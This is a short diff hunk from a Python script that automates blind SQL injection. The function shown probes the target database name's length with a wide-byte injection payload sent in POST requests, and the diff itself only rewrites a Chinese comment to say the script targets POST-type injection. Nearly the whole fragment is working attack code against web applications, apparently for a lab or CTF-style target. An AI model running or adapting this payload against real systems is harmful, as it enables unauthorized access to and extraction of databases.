@@ -29,7 +29,7 @@ def CurrentDatabaseWide():
     while True:
         if j>k and j<n and j-k>3:
             payload1 = "name=lili%df' or length(database())>"+str(j)+"-- ss&submit=%E6%9F%A5%E8%AF%A2"           #所有payload根据实际情况填写，必须是字符串形式
-            response = requests.post(url, data = payload1, headers = headers)     #本脚本根据GET型注入编写，遇到POST型可修改改行方法和参数，其他所有函数中同样
+            response = requests.post(url, data = payload1, headers = headers)     #本脚本根据POST型注入编写，遇到其他类型可修改方法和参数，其他所有函数中同样
             #print(response.request.headers)
             #print(response.request.body)
             if response.text.find(flag) != -1:
